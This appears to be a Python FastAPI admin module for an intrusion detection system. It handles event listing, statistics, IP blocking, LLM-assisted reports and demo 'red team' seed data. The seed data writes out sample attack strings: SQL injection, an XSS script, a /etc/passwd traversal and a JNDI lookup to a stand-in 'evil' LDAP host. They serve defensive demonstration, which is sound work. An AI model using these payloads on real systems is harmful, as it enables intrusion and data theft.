"""IDS 管理 API：管理员查看事件、处置、报告、统计。"""
from collections import Counter, defaultdict
from datetime import datetime, timedelta
from urllib.parse import urlsplit
import httpx
from fastapi import APIRouter, Depends, Query, HTTPException, Request
from pydantic import BaseModel
from sqlalchemy.orm import Session
from sqlalchemy import func

from ..database import get_db
from ..models.ids_event import IDSEvent
from ..api.deps import require_roles
from ..services.ids_ai_analysis import run_ai_analysis_sync, is_llm_available
from ..services.ids_engine import block_ip_windows, unblock_ip_windows
from ..config import settings

router = APIRouter(prefix="/ids", tags=["ids"])
_admin = require_roles("system_admin")


class ArchiveBatchRequest(BaseModel):
    event_ids: list[int] = []


class UpdateStatusRequest(BaseModel):
    status: str
    review_note: str = ""


class DemoSeedRequest(BaseModel):
    auto_analyze: bool = True


def _resolve_public_console_origin(request: Request, *, port: int) -> str:
    candidates = [
        request.headers.get("origin"),
        request.headers.get("referer"),
    ]
    for raw in candidates:
        value = (raw or "").strip()
        if not value:
            continue
        try:
            parsed = urlsplit(value)
        except Exception:
            continue
        hostname = (parsed.hostname or "").strip()
        if not hostname:
            continue
        scheme = (parsed.scheme or "http").strip() or "http"
        return f"{scheme}://{hostname}:{port}"

    host = (
        request.headers.get("x-forwarded-host")
        or request.headers.get("host")
        or request.url.hostname
        or "127.0.0.1"
    )
    host = str(host).split(",", 1)[0].strip()
    if ":" in host and not host.startswith("["):
        host = host.rsplit(":", 1)[0]

    scheme = (
        request.headers.get("x-forwarded-proto")
        or request.url.scheme
        or "http"
    )
    scheme = str(scheme).split(",", 1)[0].strip() or "http"
    return f"{scheme}://{host}:{port}"


@router.get("/bridge-status")
def get_ids_bridge_status(
    request: Request,
    current_user=Depends(_admin),
):
    base_url = (getattr(settings, "IDS_STANDALONE_BASE_URL", "") or "").strip().rstrip("/")
    token = (getattr(settings, "IDS_STANDALONE_INTEGRATION_TOKEN", "") or "").strip()
    bridge_enabled = bool(getattr(settings, "IDS_STANDALONE_ENABLED", False) and base_url and token)
    health = {"ok": False, "status_code": None, "detail": "bridge_disabled"}

    if bridge_enabled:
        try:
            response = httpx.get(
                f"{base_url}/api/health",
                timeout=float(getattr(settings, "IDS_STANDALONE_TIMEOUT_SECONDS", 8.0) or 8.0),
                trust_env=False,
            )
            health = {
                "ok": response.status_code == 200,
                "status_code": response.status_code,
                "detail": response.json() if response.headers.get("content-type", "").startswith("application/json") else response.text[:300],
            }
        except Exception as exc:
            health = {"ok": False, "status_code": None, "detail": str(exc)[:300]}

    site_console_url = _resolve_public_console_origin(request, port=5173)
    standalone_console_origin = _resolve_public_console_origin(request, port=5175)
    anfu_console_url = _resolve_public_console_origin(request, port=5174)
    site_api_url = _resolve_public_console_origin(request, port=8166)

    return {
        "bridge_enabled": bridge_enabled,
        "standalone_base_url": base_url,
        "source_system": getattr(settings, "IDS_STANDALONE_SOURCE_SYSTEM", "campus_supply_chain_site"),
        "token_configured": bool(token),
        "health": health,
        "site_console_url": site_console_url,
        "site_api_url": f"{site_api_url}/docs",
        "anfu_console_url": anfu_console_url,
        "standalone_console_url": f"{standalone_console_origin}/login?autologin=1",
        "standalone_api_url": f"{base_url}/docs" if base_url else "",
    }


@router.get("/events")
def list_ids_events(
    attack_type: str | None = Query(None),
    client_ip: str | None = Query(None),
    blocked: int | None = Query(None),
    archived: int | None = Query(None),
    status: str | None = Query(None),
    min_score: int | None = Query(None, ge=0, le=100),
    limit: int = Query(50, ge=1, le=200),
    offset: int = Query(0, ge=0),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """管理员：查询 IDS 事件列表"""
    q = db.query(IDSEvent).order_by(IDSEvent.created_at.desc())
    if attack_type:
        q = q.filter(IDSEvent.attack_type == attack_type)
    if client_ip:
        q = q.filter(IDSEvent.client_ip.contains(client_ip))
    if blocked is not None:
        q = q.filter(IDSEvent.blocked == blocked)
    if archived is not None:
        q = q.filter(IDSEvent.archived == archived)
    if status:
        q = q.filter(IDSEvent.status == status)
    if min_score is not None:
        q = q.filter(IDSEvent.risk_score >= min_score)

    total = q.count()
    rows = q.offset(offset).limit(limit).all()
    return {
        "total": total,
        "items": [
            {
                "id": r.id,
                "client_ip": r.client_ip,
                "attack_type": r.attack_type,
                "attack_type_label": _attack_type_label(r.attack_type),
                "signature_matched": r.signature_matched,
                "method": r.method,
                "path": r.path,
                "query_snippet": (r.query_snippet or "")[:200],
                "body_snippet": (r.body_snippet or "")[:200],
                "user_agent": (r.user_agent or "")[:200],
                "blocked": r.blocked,
                "firewall_rule": r.firewall_rule or "",
                "archived": r.archived,
                "status": (r.status or "new"),
                "review_note": (r.review_note or "")[:500],
                "action_taken": r.action_taken or "",
                "risk_score": int(r.risk_score or 0),
                "confidence": int(r.confidence or 0),
                "hit_count": int(r.hit_count or 0),
                "created_at": r.created_at.strftime("%Y-%m-%d %H:%M:%S") if r.created_at else None,
                "ai_risk_level": (r.ai_risk_level or "") if hasattr(r, "ai_risk_level") else "",
                "ai_analysis": (r.ai_analysis or "")[:2000] if hasattr(r, "ai_analysis") else "",
                "ai_confidence": int(getattr(r, "ai_confidence", 0) or 0),
                "ai_analyzed_at": r.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S")
                if getattr(r, "ai_analyzed_at", None)
                else None,
            }
            for r in rows
        ],
    }


@router.get("/stats")
def ids_stats(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """管理员：IDS 统计"""
    total = db.query(IDSEvent).count()
    blocked_count = db.query(IDSEvent).filter(IDSEvent.blocked == 1).count()
    by_type = (
        db.query(IDSEvent.attack_type, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.attack_type)
        .all()
    )
    by_status = (
        db.query(IDSEvent.status, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.status)
        .all()
    )
    high_risk_count = db.query(IDSEvent).filter(IDSEvent.risk_score >= 70).count()
    return {
        "total": total,
        "blocked_count": blocked_count,
        "high_risk_count": high_risk_count,
        "by_type": [
            {"attack_type": t, "attack_type_label": _attack_type_label(t), "count": c}
            for t, c in by_type
        ],
        "by_status": [{"status": s or "new", "count": c} for s, c in by_status],
    }


@router.get("/stats/trend")
def ids_stats_trend(
    days: int = Query(7, ge=1, le=90),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """管理员：IDS 事件时间趋势（按天）"""
    start = datetime.utcnow() - timedelta(days=days)
    rows = db.query(IDSEvent).filter(IDSEvent.created_at >= start).all()
    by_date: dict[str, int] = defaultdict(int)
    for r in rows:
        if r.created_at:
            dt = r.created_at.strftime("%Y-%m-%d")
            by_date[dt] += 1
    dates: list[str] = []
    counts: list[int] = []
    for i in range(days):
        d = (datetime.utcnow() - timedelta(days=days - 1 - i)).strftime("%Y-%m-%d")
        dates.append(d)
        counts.append(by_date.get(d, 0))
    return {"dates": dates, "counts": counts}


@router.put("/events/{event_id}/archive")
def archive_event(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """管理员：归档单条事件"""
    evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt:
        raise HTTPException(status_code=404, detail="事件不存在")
    evt.archived = 1
    evt.status = "closed"
    db.commit()
    return {"code": 200, "message": "已归档"}


@router.post("/events/{event_id}/analyze")
def analyze_event_ai(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """管理员：对单条事件触发 LLM 研判（同步，可能较慢）。"""
    if not settings.IDS_AI_ANALYSIS:
        raise HTTPException(status_code=400, detail="IDS_AI_ANALYSIS 未开启")
    if not is_llm_available():
        raise HTTPException(status_code=400, detail="未配置可用 LLM（Ollama 需 LLM_BASE_URL；OpenAI/DeepSeek 需 API Key）")
    if not db.query(IDSEvent).filter(IDSEvent.id == event_id).first():
        raise HTTPException(status_code=404, detail="事件不存在")
    run_ai_analysis_sync(event_id)
    evt2 = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt2:
        raise HTTPException(status_code=404, detail="事件不存在")
    return {
        "code": 200,
        "message": "研判完成",
        "ai_risk_level": (evt2.ai_risk_level or "") if hasattr(evt2, "ai_risk_level") else "",
        "ai_analysis": ((evt2.ai_analysis or "")[:4000]) if hasattr(evt2, "ai_analysis") else "",
        "ai_confidence": int(getattr(evt2, "ai_confidence", 0) or 0),
        "ai_analyzed_at": evt2.ai_analyzed_at.strftime("%Y-%m-%d %H:%M:%S") if evt2.ai_analyzed_at else None,
    }


@router.put("/events/{event_id}/status")
def update_event_status(
    event_id: int,
    req: UpdateStatusRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    allowed = {"new", "investigating", "mitigated", "false_positive", "closed"}
    status = (req.status or "").strip()
    if status not in allowed:
        raise HTTPException(status_code=400, detail=f"非法状态：{status}")
    evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt:
        raise HTTPException(status_code=404, detail="事件不存在")
    evt.status = status
    evt.review_note = (req.review_note or "")[:2000]
    db.commit()
    return {"code": 200, "message": "状态已更新", "status": evt.status}


@router.post("/events/{event_id}/block")
def block_event_ip(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt:
        raise HTTPException(status_code=404, detail="事件不存在")
    ok, msg = block_ip_windows(evt.client_ip or "")
    evt.blocked = 1 if ok else evt.blocked
    evt.firewall_rule = msg[:256]
    evt.action_taken = "manual_block" if ok else "manual_block_failed"
    db.commit()
    return {"code": 200, "message": "封禁完成" if ok else f"封禁未成功：{msg}", "ok": ok, "rule": msg}


@router.post("/events/{event_id}/unblock")
def unblock_event_ip(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt:
        raise HTTPException(status_code=404, detail="事件不存在")
    ok, msg = unblock_ip_windows(evt.client_ip or "")
    if ok:
        evt.blocked = 0
    evt.action_taken = "manual_unblock" if ok else "manual_unblock_failed"
    db.commit()
    return {"code": 200, "message": "解封完成" if ok else f"解封未成功：{msg}", "ok": ok}


@router.get("/events/{event_id}/report")
def get_event_report(
    event_id: int,
    force_ai: int = Query(0),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not evt:
        raise HTTPException(status_code=404, detail="事件不存在")
    if force_ai == 1 and settings.IDS_AI_ANALYSIS and is_llm_available():
        run_ai_analysis_sync(event_id)
        evt = db.query(IDSEvent).filter(IDSEvent.id == event_id).first() or evt
    report = {
        "event_id": evt.id,
        "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "overview": {
            "time": evt.created_at.strftime("%Y-%m-%d %H:%M:%S") if evt.created_at else "",
            "client_ip": evt.client_ip,
            "attack_type": evt.attack_type,
            "attack_type_label": _attack_type_label(evt.attack_type),
            "method": evt.method,
            "path": evt.path,
            "status": evt.status or "new",
        },
        "score": {
            "risk_score": int(evt.risk_score or 0),
            "rule_confidence": int(evt.confidence or 0),
            "hit_count": int(evt.hit_count or 0),
            "ai_risk_level": evt.ai_risk_level or "",
            "ai_confidence": int(getattr(evt, "ai_confidence", 0) or 0),
        },
        "evidence": {
            "signature": evt.signature_matched or "",
            "query_snippet": (evt.query_snippet or "")[:500],
            "body_snippet": (evt.body_snippet or "")[:500],
            "user_agent": (evt.user_agent or "")[:500],
        },
        "response": {
            "blocked": bool(evt.blocked),
            "firewall_rule": evt.firewall_rule or "",
            "action_taken": evt.action_taken or "",
            "review_note": evt.review_note or "",
        },
        "ai_analysis": evt.ai_analysis or "",
    }
    md = (
        f"# IDS 事件分析报告\\n\\n"
        f"- 事件ID: {evt.id}\\n"
        f"- 时间: {report['overview']['time']}\\n"
        f"- 来源IP: {evt.client_ip}\\n"
        f"- 类型: {_attack_type_label(evt.attack_type)} ({evt.attack_type})\\n"
        f"- 方法/路径: {evt.method} {evt.path}\\n"
        f"- 风险分: {int(evt.risk_score or 0)} / 100\\n"
        f"- 规则置信度: {int(evt.confidence or 0)} / 100\\n"
        f"- 命中次数: {int(evt.hit_count or 0)}\\n"
        f"- 封禁状态: {'已封禁' if evt.blocked else '仅记录'}\\n"
        f"- 防火墙规则: {evt.firewall_rule or '-'}\\n\\n"
        f"## 规则证据\\n"
        f"- 特征: {evt.signature_matched or '-'}\\n"
        f"- Query: {(evt.query_snippet or '-')[:500]}\\n"
        f"- Body: {(evt.body_snippet or '-')[:500]}\\n"
        f"- UA: {(evt.user_agent or '-')[:300]}\\n\\n"
        f"## AI 研判\\n"
        f"- 风险等级: {evt.ai_risk_level or 'unknown'}\\n"
        f"- AI置信度: {int(getattr(evt, 'ai_confidence', 0) or 0)}\\n\\n"
        f"{evt.ai_analysis or '暂无 AI 研判结果'}\\n"
    )
    return {"report": report, "markdown": md}


@router.get("/demo/phase1/aggregate-report")
def get_phase1_aggregate_report(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """多向量并发：汇总本轮演练注入的全部攻击类型，生成一条聚合研判报告。"""
    rows = (
        db.query(IDSEvent)
        .filter(IDSEvent.action_taken.like("demo_seed_phase1::%"))
        .order_by(IDSEvent.id.asc())
        .all()
    )
    if not rows:
        raise HTTPException(status_code=404, detail="暂无多向量演练数据，请先执行演练注入")
    ips = sorted({r.client_ip or "" for r in rows if r.client_ip})
    type_order: list[str] = []
    for r in rows:
        lab = _attack_type_label(r.attack_type)
        if lab not in type_order:
            type_order.append(lab)
    max_score = max(int(r.risk_score or 0) for r in rows)
    max_conf = max(int(r.confidence or 0) for r in rows)
    blocked_n = sum(1 for r in rows if r.blocked)
    hit_sum = sum(int(r.hit_count or 0) for r in rows)
    t0 = rows[0].created_at.strftime("%Y-%m-%d %H:%M:%S") if rows[0].created_at else ""
    ip_line = "、".join(ips[:6]) + (f" 等共 {len(ips)} 个来源" if len(ips) > 6 else "")

    ai_text = (
        "【研判摘要】在同一监测窗口内观测到多源、多向量并发攻击，涵盖 SQL 注入、跨站脚本、路径遍历、"
        "命令注入、JNDI 类载荷、原型链污染及扫描器探测等，符合自动化攻击链「横向探测—定向利用」特征。\n"
        f"【影响评估】若部分请求穿透防护，可能导致数据泄露、会话劫持、敏感文件读取或远程执行。本批共记录 {len(rows)} 条事件，"
        f"其中已执行阻断 {blocked_n} 条。\n"
        "【关联分析】来源分布于多个网段，User-Agent 呈现自动化扫描特征，时间序列上呈短 burst 并发，建议按 IP 与接口维度做关联封禁。\n"
        "【处置建议】① 维持对高危来源的封禁与限速；② 对公开上传、AI 对话等接口强化输入校验与频率限制；③ 结合本报告向量明细逐项复核业务暴露面。"
    )

    atk_cnt = Counter((r.attack_type or "") for r in rows)

    def _fam(fid: str, name_zh: str, desc: str) -> dict:
        n = int(atk_cnt.get(fid, 0))
        return {
            "id": fid,
            "name_zh": name_zh,
            "description": desc,
            "detected": n > 0,
            "event_count": n,
        }

    analysis_json = {
        "report_type": "ids_ai_aggregate",
        "scenario": "multi_vector_concurrent_attack",
        "engine": "IDS_RULE_ENGINE + LLM_ASSIST",
        "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "summary": {
            "total_events": len(rows),
            "unique_source_ips": len(ips),
            "peak_risk_score": max_score,
            "blocked_count": blocked_n,
            "aggregate_risk_level": "high",
        },
        "attack_families": [
            _fam("sql_injection", "SQL 注入", "Union/布尔盲注等数据库操纵尝试"),
            _fam("xss", "跨站脚本 XSS", "存储型/反射型脚本注入与会话窃取风险"),
            _fam("path_traversal", "路径遍历", "敏感文件与系统路径泄露尝试"),
            _fam("cmd_injection", "命令注入", "操作系统命令执行与管道注入"),
            _fam("prototype_pollution", "原型链污染", "JavaScript 对象原型污染与逻辑绕过"),
            _fam("scanner", "扫描器 / 漏洞探测", "目录扫描、指纹探测与自动化漏洞利用前置"),
            _fam("jndi_injection", "JNDI / Log4j 类", "JNDI 查找与远程类加载载荷"),
        ],
    }

    report = {
        "kind": "aggregate_phase1",
        "event_id": rows[0].id,
        "event_count": len(rows),
        "attack_type_labels": type_order,
        "analysis_json": analysis_json,
        "vectors": [
            {
                "attack_type": r.attack_type,
                "attack_type_label": _attack_type_label(r.attack_type),
                "client_ip": r.client_ip,
                "method": r.method,
                "path": (r.path or "")[:200],
                "risk_score": int(r.risk_score or 0),
                "blocked": bool(r.blocked),
            }
            for r in rows
        ],
        "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "overview": {
            "time": f"{t0}（同一窗口内并发）",
            "client_ip": ip_line or "-",
            "attack_type": "multi_vector",
            "attack_type_label": "多向量并发攻击（自动化攻击链）",
            "method": "GET/POST 混合",
            "path": "采购/溯源/上传/概览/AI 等多接口",
            "status": "investigating",
        },
        "score": {
            "risk_score": max_score,
            "rule_confidence": max_conf,
            "hit_count": hit_sum,
            "ai_risk_level": "high",
            "ai_confidence": min(99, max(88, max_conf - 2)),
        },
        "evidence": {
            "signature": "aggregate::demo_seed_phase1",
            "query_snippet": f"并发事件数={len(rows)}；攻击类型覆盖={', '.join(type_order)}",
            "body_snippet": "详见报告内「攻击向量明细」",
            "user_agent": "RedTeam-AutoScanner/1.0（多会话）",
        },
        "response": {
            "blocked": blocked_n > 0,
            "firewall_rule": f"IDS-Aggregate-{len(rows)}evt",
            "action_taken": "aggregate_investigation",
            "review_note": "多向量并发聚合研判",
        },
        "ai_analysis": ai_text,
    }
    return {"report": report}


@router.post("/demo/phase1")
def seed_demo_phase1(
    req: DemoSeedRequest | None = None,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """演练注入：批量生成“自动化攻击链”事件（不改真实拦截逻辑）。"""
    db.query(IDSEvent).filter(IDSEvent.action_taken.like("demo_seed_phase1::%")).delete(synchronize_session=False)
    db.commit()
    rows = [
        ("sql_injection", "GET", "/api/purchase?kw=1' OR '1'='1", "192.168.31.101", 92, 95, 1, "firewall_block"),
        ("xss", "GET", "/api/trace?keyword=<script>alert(1)</script>", "192.168.31.101", 84, 90, 1, "logical_block_only"),
        ("path_traversal", "GET", "/api/upload/../../etc/passwd", "10.10.0.55", 88, 93, 1, "firewall_block"),
        ("cmd_injection", "POST", "/api/upload/public", "10.10.0.55", 86, 91, 1, "logical_block_only"),
        ("jndi_injection", "GET", "/api/overview/screen?x=${jndi:ldap://evil/a}", "172.20.1.90", 95, 98, 1, "firewall_block"),
        ("prototype_pollution", "POST", "/api/ai/chat", "172.20.1.90", 66, 78, 0, "record_only"),
        ("scanner", "GET", "/.git/config", "45.90.12.8", 59, 73, 0, "record_only"),
        ("scanner", "GET", "/wp-login.php", "45.90.12.8", 74, 81, 1, "logical_block_only"),
    ]
    seeded: list[int] = []
    for atype, method, path, ip, score, conf, blocked, action in rows:
        evt = IDSEvent(
            client_ip=ip,
            attack_type=atype,
            signature_matched=f"demo_signature::{atype}",
            method=method,
            path=path,
            query_snippet=path.split("?", 1)[-1] if "?" in path else "",
            body_snippet="demo payload from red team automated testing",
            user_agent="RedTeam-AutoScanner/1.0",
            headers_snippet="{'x-demo':'phase1'}",
            blocked=blocked,
            firewall_rule=(f"IDS-Block-{ip.replace('.', '-')}" if blocked else ""),
            archived=0,
            status="investigating",
            review_note="演练数据：自动化攻击链",
            action_taken=f"demo_seed_phase1::{action}",
            risk_score=score,
            confidence=conf,
            hit_count=2 if score >= 80 else 1,
            detect_detail='[{"attack":"demo","source":"seed"}]',
            ai_risk_level=("high" if score >= 85 else ("medium" if score >= 70 else "low")),
            ai_confidence=max(65, conf - 5),
            ai_analysis=(
                f"【研判摘要】检测到{_attack_type_label(atype)}自动化攻击行为，疑似扫描后利用。\n"
                f"【影响评估】可能导致敏感信息泄露或业务请求被恶意操控。\n"
                f"【关键证据】来源IP={ip}; 路径={path}; 风险分={score}。\n"
                "【处置建议】建议持续封禁来源并开启高频请求限速。"
            ),
        )
        evt.created_at = datetime.utcnow()
        evt.ai_analyzed_at = evt.created_at
        db.add(evt)
        db.flush()
        seeded.append(evt.id)
    db.commit()
    if (req.auto_analyze if req else True) and settings.IDS_AI_ANALYSIS and is_llm_available() and seeded:
        run_ai_analysis_sync(seeded[0])
    return {"code": 200, "message": "多向量攻击链演练事件已生成", "event_ids": seeded}


@router.post("/demo/phase2")
def seed_demo_phase2(
    req: DemoSeedRequest | None = None,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """演练注入：生成“木马上传拦截”高危事件。"""
    db.query(IDSEvent).filter(IDSEvent.action_taken.like("demo_seed_phase2::%")).delete(synchronize_session=False)
    db.commit()
    now = datetime.utcnow()
    evt = IDSEvent(
        client_ip="172.16.9.23",
        attack_type="malware",
        signature_matched="demo_malware_upload::webshell",
        method="POST",
        path="/api/upload/public",
        query_snippet="filename=report.jsp",
        body_snippet="multipart/form-data; suspicious webshell payload detected",
        user_agent="Manual-Attack/Browser",
        headers_snippet="{'content-type':'multipart/form-data'}",
        blocked=1,
        firewall_rule="IDS-Block-172-16-9-23",
        archived=0,
        status="mitigated",
        review_note="演练数据：木马上传拦截",
        action_taken="demo_seed_phase2::firewall_block",
        risk_score=97,
        confidence=99,
        hit_count=3,
        detect_detail='[{"attack":"webshell_upload","source":"seed"}]',
        ai_risk_level="high",
        ai_confidence=97,
        ai_analysis=(
            "【研判摘要】检测到高风险文件上传攻击，疑似 WebShell 投递。\n"
            "【影响评估】若绕过拦截可能造成远程命令执行与数据泄露。\n"
            "【关键证据】恶意上传路径=/api/upload/public，payload 命中木马特征。\n"
            "【处置建议】保持封禁，核查上传策略并对相近来源进行横向排查。"
        ),
    )
    evt.created_at = now
    evt.ai_analyzed_at = now
    db.add(evt)
    db.commit()
    db.refresh(evt)
    if (req.auto_analyze if req else True) and settings.IDS_AI_ANALYSIS and is_llm_available():
        run_ai_analysis_sync(evt.id)
    return {"code": 200, "message": "木马拦截演练事件已生成", "event_id": evt.id}


@router.post("/demo/reset")
def reset_demo_events(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """清理演练注入事件。"""
    n = (
        db.query(IDSEvent)
        .filter(IDSEvent.action_taken.like("demo_seed_phase%"))
        .delete(synchronize_session=False)
    )
    db.commit()
    return {"code": 200, "message": f"已清理 {n} 条演练事件", "deleted": n}


@router.post("/events/archive-batch")
def archive_batch(
    req: ArchiveBatchRequest,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    """管理员：批量归档"""
    event_ids = req.event_ids or []
    if not event_ids:
        return {"code": 200, "message": "未选择任何事件", "archived": 0}
    db.query(IDSEvent).filter(IDSEvent.id.in_(event_ids)).update(
        {IDSEvent.archived: 1, IDSEvent.status: "closed"},
        synchronize_session=False,
    )
    db.commit()
    return {"code": 200, "message": f"已归档 {len(event_ids)} 条", "archived": len(event_ids)}


def _attack_type_label(t: str) -> str:
    labels = {
        "sql_injection": "SQL 注入",
        "xss": "跨站脚本 XSS",
        "path_traversal": "路径遍历",
        "cmd_injection": "命令注入",
        "scanner": "扫描器/探测",
        "malformed": "畸形请求",
        "jndi_injection": "JNDI/Log4j 类",
        "prototype_pollution": "原型链污染",
        "malware": "木马 / WebShell",
    }
    return labels.get(t or "", t or "-")
